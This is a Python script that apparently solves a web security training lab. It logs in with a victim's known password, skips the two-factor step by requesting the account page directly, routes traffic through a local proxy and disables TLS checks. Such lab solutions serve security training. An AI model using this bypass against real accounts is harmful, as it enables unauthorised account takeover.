import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):
	#login as victims account
	login_url = url + "/login"
	login_data = {"username": "carlos", "Password": "montoya"}
	r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)

	#confirm Bypass
	myaccount_url = url + "/my-account"
	r = s.get(myaccount_url, verify=False, proxies=proxies)
	if 'Log out' in r.text:
		print("2FA Bupass successfull...")
	else:
		print("exploit Failed")
		sys.exit(-1)

def main():
	s = requests.Session()
	url = "https://0a0e00ae03738b7d8149304c00d200c7.web-security-academy.net"
	access_carlos_account(s, url)

if __name__=="__main__":
	main()